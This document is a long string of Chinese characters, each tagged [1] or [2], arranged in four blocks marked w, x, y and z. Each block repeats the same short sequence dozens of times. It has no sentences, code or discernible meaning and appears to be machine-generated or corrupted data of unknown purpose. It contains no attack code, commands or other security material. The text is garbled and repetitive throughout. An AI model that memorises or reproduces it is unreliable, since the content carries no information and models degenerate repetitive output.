[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1] x出[1]过[2]里[1]自[1]量[1]重[1]文[2]指[2]几[1]金[1]采[1]采[2]切[2]万[2]至[1]织[2]备[2]准[1]率[2]标[2]片[2]减[1]均[2]致[1]击[1]升[2]重[1]燃[1]假[2]皇[2]凯[1]镇[2]x出[1]过[2]里[1]自[1]量[1]重[1]文[2]指[2]几[1]金[1]采[1]采[2]切[2]万[2]至[1]织[2]备[2]准[1]率[2]标[2]片[2]减[1]均[2]致[1]击[1]升[2]重[1]燃[1]假[2]皇[2]凯[1]镇[2]x出[1]过[2]里[1]自[1]量[1]重[1]文[2]指[2]几[1]金[1]采[1]采[2]切[2]万[2]至[1]织[2]备[2]准[1]率[2]标[2]片[2]减[1]均[2]致[1]击[1]升[2]重[1]燃[1]假[2]皇[2]凯[1]镇[2]x出[1]过[2]里[1]自[1]量[1]重[1]文[2]指[2]几[1]金[1]采[1]采[2]切[2]万[2]至[1]织[2]备[2]准[1]率[2]标[2]片[2]减[1]均[2]致[1]击[1]升[2]重[1]燃[1]假[2]皇[2]凯[1]镇[2]x出[1]过[2]里[1]自[1]量[1]重[1]文[2]指[2]几[1]金[1]采[1]采[2]切[2]万[2]至[1]织[2]备[2]准[1]率[2]标[2]片[2]减[1]均[2]致[1]击[1]升[2]重[1]燃[1]假[2]皇[2]凯[1]镇[2]x出[1]过[2]里[1]自[1]量[1]重[1]文[2]指[2]几[1]金[1]采[1]采[2]切[2]万[2]至[1]织[2]备[2]准[1]率[2]标[2]片[2]减[1]均[2]致[1]击[1]升[2]重[1]燃[1]假[2]皇[2]凯[1]镇[2]x出[1]过[2]里[1]自[1]量[1]重[1]文[2]指[2]几[1]金[1]采[1]采[2]切[2]万[2]至[1]织[2]备[2]准[1]率[2]标[2]片[2]减[1]均[2]致[1]击[1]升[2]重[1]燃[1]假[2]皇[2]凯[1]镇[2]x出[1]过[2]里[1]自[1]量[1]重[1]文[2]指[2]几[1]金[1]采[1]采[2]切[2]万[2]至[1]织[2]备[2]准[1]率[2]标[2]片[2]减[1]均[2]致[1]击[1]升[2]重[1]燃[1]假[2]皇[2]凯[1]镇[2]x出[1]过[2]里[1]自[1]量[1]重[1]文[2]指[2]几[1]金[1]采[1]采[2]切[2]万[2]至[1]织[2]备[2]准[1]率[2]标[2]片[2]减[1]均[2]致[1]击[1]升[2]重[1]燃[1]假[2]皇[2]凯[1]镇[2]x出[1]过[2]里[1]自[1]量[1]重[1]文[2]指[2]几[1]金[1]采[1]采[2]切[2]万[2]至[1]织[2]备[2]准[1]率[2]标[2]片[2]减[1]均[2]致[1]击[1]升[2]重[1]燃[1]假[2]皇[2]凯[1]镇[2]x出[1]过[2]里[1]自[1]量[1]重[1]文[2]指[2]几[1]金[1]采[1]采[2]切[2]万[2]至[1]织[2]备[2]准[1]率[2]标[2]片[2]减[1]均[2]致[1]击[1]升[2]重[1]燃[1]假[2]皇[2]凯[1]镇[2]x出[1]过[2]里[1]自[1]量[1]重[1]文[2]指[2]几[1]金[1]采[1]采[2]切[2]万[2]至[1]织[2]备[2]准[1]率[2]标[2]片[2]减[1]均[2]致[1]击[1]升[2]重[1]燃[1]假[2]皇[2]凯[1]镇[2]x出[1]过[2]里[1]自[1]量[1]重[1]文[2]指[2]几[1]金[1]采[1]采[2]切[2]万[2]至[1]织[2]备[2]准[1]率[2]标[2]片[2]减[1]均[2]致[1]击[1]升[2]重[1]燃[1]假[2]皇[2]凯[1]镇[2]x出[1]过[2]里[1]自[1]量[1]重[1]文[2]指[2]几[1]金[1]采[1]采[2]切[2]万[2]至[1]织[2]备[2]准[1]率[2]标[2]片[2]减[1]均[2]致[1]击[1]升[2]重[1]燃[1]假[2]皇[2]凯[1]镇[2]x出[1]过[2]里[1]自[1]量[1]重[1]文[2]指[2]几[1]金[1]采[1]采[2]切[2]万[2]至[1]织[2]备[2]准[1]率[2]标[2]片[2]减[1]均[2]致[1]击[1]升[2]重[1]燃[1]假[2]皇[2]凯[1]镇[2]x出[1]过[2]里[1]自[1]量[1]重[1]文[2]指[2]几[1]金[1]采[1]采[2]切[2]万[2]至[1]织[2]备[2]准[1]率[2]标[2]片[2]减[1]均[2]致[1]击[1]升[2]重[1]燃[1]假[2]皇[2]凯[1]镇[2]x出[1]过[2]里[1]自[1]量[1]重[1]文[2]指[2]几[1]金[1]采[1]采[2]切[2]万[2]至[1]织[2]备[2]准[1]率[2]标[2]片[2]减[1]均[2]致[1]击[1]升[2]重[1]燃[1]假[2]皇[2]凯[1]镇[2]x出[1]过[2]里[1]自[1]量[1]重[1]文[2]指[2]几[1]金[1]采[1]采[2]切[2]万[2]至[1]织[2]备[2]准[1]率[2]标[2]片[2]减[1]均[2]致[1]击[1]升[2]重[1]燃[1]假[2]皇[2]凯[1]镇[2]x出[1]过[2]里[1]自[1]量[1]重[1]文[2]指[2]几[1]金[1]采[1]采[2]切[2]万[2]至[1]织[2]备[2]准[1]率[2]标[2]片[2]减[1]均[2]致[1]击[1]升[2]重[1]燃[1]假[2]皇[2]凯[1]镇[2]x出[1]过[2]里[1]自[1]量[1]重[1]文[2]指[2]几[1]金[1]采[1]采[2]切[2]万[2]至[1]织[2]备[2]准[1]率[2]标[2]片[2]减[1]均[2]致[1]击[1]升[2]重[1]燃[1]假[2]皇[2]凯[1]镇[2]x出[1]过[2]里[1]自[1]量[1]重[1]文[2]指[2]几[1]金[1]采[1]采[2]切[2]万[2]至[1]织[2]备[2]准[1]率[2]标[2]片[2]减[1]均[2]致[1]击[1]升[2]重[1]燃[1]假[2]皇[2]凯[1]镇[2]x出[1]过[2]里[1]自[1]量[1]重[1]文[2]指[2]几[1]金[1]采[1]采[2]切[2]万[2]至[1]织[2]备[2]准[1]率[2]标[2]片[2]减[1]均[2]致[1]击[1]升[2]重[1]燃[1]假[2]皇[2]凯[1]镇[2]x出[1]过[2]里[1]自[1]量[1]重[1]文[2]指[2]几[1]金[1]采[1]采[2]切[2]万[2]至[1]织[2]备[2]准[1]率[2]标[2]片[2]减[1]均[2]致[1]击[1]升[2]重[1]燃[1]假[2]皇[2]凯[1]镇[2]x出[1]过[2]里[1]自[1]量[1]重[1]文[2]指[2]几[1]金[1]采[1]采[2]切[2]万[2]至[1]织[2]备[2]准[1]率[2]标[2]片[2]减[1]均[2]致[1]击[1]升[2]重[1]燃[1]假[2]皇[2]凯[1]镇[2]x出[1]过[2]里[1]自[1]量[1]重[1]文[2]指[2]几[1]金[1]采[1]采[2]切[2]万[2]至[1]织[2]备[2]准[1]率[2]标[2]片[2]减[1]均[2]致[1]击[1]升[2]重[1]燃[1]假[2]皇[2]凯[1]镇[2]x出[1]过[2]里[1]自[1]量[1]重[1]文[2]指[2]几[1]金[1]采[1]采[2]切[2]万[2]至[1]织[2]备[2]准[1]率[2]标[2]片[2]减[1]均[2]致[1]击[1]升[2]重[1]燃[1]假[2]皇[2]凯[1]镇[2]x出[1]过[2]里[1]自[1]量[1]重[1]文[2]指[2]几[1]金[1]采[1]采[2]切[2]万[2]至[1]织[2]备[2]准[1]率[2]标[2]片[2]减[1]均[2]致[1]击[1]升[2]重[1]燃[1]假[2]皇[2]凯[1]镇[2]x出[1]过[2]里[1]自[1]量[1]重[1]文[2]指[2]几[1]金[1]采[1]采[2]切[2]万[2]至[1]织[2]备[2]准[1]率[2]标[2]片[2]减[1]均[2]致[1]击[1]升[2]重[1]燃[1]假[2]皇[2]凯[1]镇[2]x出[1]过[2]里[1]自[1]量[1]重[1]文[2]指[2]几[1]金[1]采[1]采[2]切[2]万[2]至[1]织[2]备[2]准[1]率[2]标[2]片[2]减[1]均[2]致[1]击[1]升[2]重[1]燃[1]假[2]皇[2]凯[1]镇[2]x出[1]过[2]里[1]自[1]量[1]重[1]文[2]指[2]几[1]金[1]采[1]采[2]切[2]万[2]至[1]织[2]备[2]准[1]率[2]标[2]片[2]减[1]均[2]致[1]击[1]升[2]重[1]燃[1]假[2]皇[2]凯[1]镇[2]x出[1]过[2]里[1]自[1]量[1]重[1]文[2]指[2]几[1]金[1]采[1]采[2]切[2]万[2]至[1]织[2]备[2]准[1]率[2]标[2]片[2]减[1]均[2]致[1]击[1]升[2]重[1]燃[1]假[2]皇[2]凯[1]镇[2]x出[1]过[2]里[1]自[1]量[1]重[1]文[2]指[2]几[1]金[1]采[1]采[2]切[2]万[2]至[1]织[2]备[2]准[1]率[2]标[2]片[2]减[1]均[2]致[1]击[1]升[2]重[1]燃[1]假[2]皇[2]凯[1]镇[2]x出[1]过[2]里[1]自[1]量[1]重[1]文[2]指[2]几[1]金[1]采[1]采[2]切[2]万[2]至[1]织[2]备[2]准[1]率[2]标[2]片[2]减[1]均[2]致[1]击[1]升[2]重[1]燃[1]假[2]皇[2]凯[1]镇[2] y了[2]分[2]理[2]内[1]但[2]军[1]将[2]农[1]决[1]领[2]再[1]况[1]集[2]商[2]历[2]准[2]写[1]识[2]圆[2]细[2]密[2]视[2]冲[1]冷[1]庆[2]陆[2]杆[2]y了[2]分[2]理[2]内[1]但[2]军[1]将[2]农[1]决[1]领[2]再[1]况[1]集[2]商[2]历[2]准[2]写[1]识[2]圆[2]细[2]密[2]视[2]冲[1]冷[1]庆[2]陆[2]杆[2]y了[2]分[2]理[2]内[1]但[2]军[1]将[2]农[1]决[1]领[2]再[1]况[1]集[2]商[2]历[2]准[2]写[1]识[2]圆[2]细[2]密[2]视[2]冲[1]冷[1]庆[2]陆[2]杆[2]y了[2]分[2]理[2]内[1]但[2]军[1]将[2]农[1]决[1]领[2]再[1]况[1]集[2]商[2]历[2]准[2]写[1]识[2]圆[2]细[2]密[2]视[2]冲[1]冷[1]庆[2]陆[2]杆[2]y了[2]分[2]理[2]内[1]但[2]军[1]将[2]农[1]决[1]领[2]再[1]况[1]集[2]商[2]历[2]准[2]写[1]识[2]圆[2]细[2]密[2]视[2]冲[1]冷[1]庆[2]陆[2]杆[2]y了[2]分[2]理[2]内[1]但[2]军[1]将[2]农[1]决[1]领[2]再[1]况[1]集[2]商[2]历[2]准[2]写[1]识[2]圆[2]细[2]密[2]视[2]冲[1]冷[1]庆[2]陆[2]杆[2]y了[2]分[2]理[2]内[1]但[2]军[1]将[2]农[1]决[1]领[2]再[1]况[1]集[2]商[2]历[2]准[2]写[1]识[2]圆[2]细[2]密[2]视[2]冲[1]冷[1]庆[2]陆[2]杆[2]y了[2]分[2]理[2]内[1]但[2]军[1]将[2]农[1]决[1]领[2]再[1]况[1]集[2]商[2]历[2]准[2]写[1]识[2]圆[2]细[2]密[2]视[2]冲[1]冷[1]庆[2]陆[2]杆[2]y了[2]分[2]理[2]内[1]但[2]军[1]将[2]农[1]决[1]领[2]再[1]况[1]集[2]商[2]历[2]准[2]写[1]识[2]圆[2]细[2]密[2]视[2]冲[1]冷[1]庆[2]陆[2]杆[2]y了[2]分[2]理[2]内[1]但[2]军[1]将[2]农[1]决[1]领[2]再[1]况[1]集[2]商[2]历[2]准[2]写[1]识[2]圆[2]细[2]密[2]视[2]冲[1]冷[1]庆[2]陆[2]杆[2]y了[2]分[2]理[2]内[1]但[2]军[1]将[2]农[1]决[1]领[2]再[1]况[1]集[2]商[2]历[2]准[2]写[1]识[2]圆[2]细[2]密[2]视[2]冲[1]冷[1]庆[2]陆[2]杆[2]y了[2]分[2]理[2]内[1]但[2]军[1]将[2]农[1]决[1]领[2]再[1]况[1]集[2]商[2]历[2]准[2]写[1]识[2]圆[2]细[2]密[2]视[2]冲[1]冷[1]庆[2]陆[2]杆[2]y了[2]分[2]理[2]内[1]但[2]军[1]将[2]农[1]决[1]领[2]再[1]况[1]集[2]商[2]历[2]准[2]写[1]识[2]圆[2]细[2]密[2]视[2]冲[1]冷[1]庆[2]陆[2]杆[2]y了[2]分[2]理[2]内[1]但[2]军[1]将[2]农[1]决[1]领[2]再[1]况[1]集[2]商[2]历[2]准[2]写[1]识[2]圆[2]细[2]密[2]视[2]冲[1]冷[1]庆[2]陆[2]杆[2]y了[2]分[2]理[2]内[1]但[2]军[1]将[2]农[1]决[1]领[2]再[1]况[1]集[2]商[2]历[2]准[2]写[1]识[2]圆[2]细[2]密[2]视[2]冲[1]冷[1]庆[2]陆[2]杆[2]y了[2]分[2]理[2]内[1]但[2]军[1]将[2]农[1]决[1]领[2]再[1]况[1]集[2]商[2]历[2]准[2]写[1]识[2]圆[2]细[2]密[2]视[2]冲[1]冷[1]庆[2]陆[2]杆[2]y了[2]分[2]理[2]内[1]但[2]军[1]将[2]农[1]决[1]领[2]再[1]况[1]集[2]商[2]历[2]准[2]写[1]识[2]圆[2]细[2]密[2]视[2]冲[1]冷[1]庆[2]陆[2]杆[2]y了[2]分[2]理[2]内[1]但[2]军[1]将[2]农[1]决[1]领[2]再[1]况[1]集[2]商[2]历[2]准[2]写[1]识[2]圆[2]细[2]密[2]视[2]冲[1]冷[1]庆[2]陆[2]杆[2]y了[2]分[2]理[2]内[1]但[2]军[1]将[2]农[1]决[1]领[2]再[1]况[1]集[2]商[2]历[2]准[2]写[1]识[2]圆[2]细[2]密[2]视[2]冲[1]冷[1]庆[2]陆[2]杆[2]y了[2]分[2]理[2]内[1]但[2]军[1]将[2]农[1]决[1]领[2]再[1]况[1]集[2]商[2]历[2]准[2]写[1]识[2]圆[2]细[2]密[2]视[2]冲[1]冷[1]庆[2]陆[2]杆[2]y了[2]分[2]理[2]内[1]但[2]军[1]将[2]农[1]决[1]领[2]再[1]况[1]集[2]商[2]历[2]准[2]写[1]识[2]圆[2]细[2]密[2]视[2]冲[1]冷[1]庆[2]陆[2]杆[2]y了[2]分[2]理[2]内[1]但[2]军[1]将[2]农[1]决[1]领[2]再[1]况[1]集[2]商[2]历[2]准[2]写[1]识[2]圆[2]细[2]密[2]视[2]冲[1]冷[1]庆[2]陆[2]杆[2]y了[2]分[2]理[2]内[1]但[2]军[1]将[2]农[1]决[1]领[2]再[1]况[1]集[2]商[2]历[2]准[2]写[1]识[2]圆[2]细[2]密[2]视[2]冲[1]冷[1]庆[2]陆[2]杆[2]y了[2]分[2]理[2]内[1]但[2]军[1]将[2]农[1]决[1]领[2]再[1]况[1]集[2]商[2]历[2]准[2]写[1]识[2]圆[2]细[2]密[2]视[2]冲[1]冷[1]庆[2]陆[2]杆[2]y了[2]分[2]理[2]内[1]但[2]军[1]将[2]农[1]决[1]领[2]再[1]况[1]集[2]商[2]历[2]准[2]写[1]识[2]圆[2]细[2]密[2]视[2]冲[1]冷[1]庆[2]陆[2]杆[2]y了[2]分[2]理[2]内[1]但[2]军[1]将[2]农[1]决[1]领[2]再[1]况[1]集[2]商[2]历[2]准[2]写[1]识[2]圆[2]细[2]密[2]视[2]冲[1]冷[1]庆[2]陆[2]杆[2]y了[2]分[2]理[2]内[1]但[2]军[1]将[2]农[1]决[1]领[2]再[1]况[1]集[2]商[2]历[2]准[2]写[1]识[2]圆[2]细[2]密[2]视[2]冲[1]冷[1]庆[2]陆[2]杆[2]y了[2]分[2]理[2]内[1]但[2]军[1]将[2]农[1]决[1]领[2]再[1]况[1]集[2]商[2]历[2]准[2]写[1]识[2]圆[2]细[2]密[2]视[2]冲[1]冷[1]庆[2]陆[2]杆[2] z其[1]全[1]关[1]内[2]公[1]情[2]者[2]党[1]入[1]必[2]先[1]光[1]六[1]共[1]清[2]具[1]八[1]元[1]装[2]际[2]酸[1]克[1]养[1]包[2]照[1]病[2]配[1]仅[2]充[1]充[2]兵[1]兴[1]故[2]超[2]迅[2]待[2]久[2]酒[1]煤[1]兰[1]担[2]免[1]慢[1]居[2]z其[1]全[1]关[1]内[2]公[1]情[2]者[2]党[1]入[1]必[2]先[1]光[1]六[1]共[1]清[2]具[1]八[1]元[1]装[2]际[2]酸[1]克[1]养[1]包[2]照[1]病[2]配[1]仅[2]充[1]充[2]兵[1]兴[1]故[2]超[2]迅[2]待[2]久[2]酒[1]煤[1]兰[1]担[2]免[1]慢[1]居[2]z其[1]全[1]关[1]内[2]公[1]情[2]者[2]党[1]入[1]必[2]先[1]光[1]六[1]共[1]清[2]具[1]八[1]元[1]装[2]际[2]酸[1]克[1]养[1]包[2]照[1]病[2]配[1]仅[2]充[1]充[2]兵[1]兴[1]故[2]超[2]迅[2]待[2]久[2]酒[1]煤[1]兰[1]担[2]免[1]慢[1]居[2]z其[1]全[1]关[1]内[2]公[1]情[2]者[2]党[1]入[1]必[2]先[1]光[1]六[1]共[1]清[2]具[1]八[1]元[1]装[2]际[2]酸[1]克[1]养[1]包[2]照[1]病[2]配[1]仅[2]充[1]充[2]兵[1]兴[1]故[2]超[2]迅[2]待[2]久[2]酒[1]煤[1]兰[1]担[2]免[1]慢[1]居[2]z其[1]全[1]关[1]内[2]公[1]情[2]者[2]党[1]入[1]必[2]先[1]光[1]六[1]共[1]清[2]具[1]八[1]元[1]装[2]际[2]酸[1]克[1]养[1]包[2]照[1]病[2]配[1]仅[2]充[1]充[2]兵[1]兴[1]故[2]超[2]迅[2]待[2]久[2]酒[1]煤[1]兰[1]担[2]免[1]慢[1]居[2]z其[1]全[1]关[1]内[2]公[1]情[2]者[2]党[1]入[1]必[2]先[1]光[1]六[1]共[1]清[2]具[1]八[1]元[1]装[2]际[2]酸[1]克[1]养[1]包[2]照[1]病[2]配[1]仅[2]充[1]充[2]兵[1]兴[1]故[2]超[2]迅[2]待[2]久[2]酒[1]煤[1]兰[1]担[2]免[1]慢[1]居[2]z其[1]全[1]关[1]内[2]公[1]情[2]者[2]党[1]入[1]必[2]先[1]光[1]六[1]共[1]清[2]具[1]八[1]元[1]装[2]际[2]酸[1]克[1]养[1]包[2]照[1]病[2]配[1]仅[2]充[1]充[2]兵[1]兴[1]故[2]超[2]迅[2]待[2]久[2]酒[1]煤[1]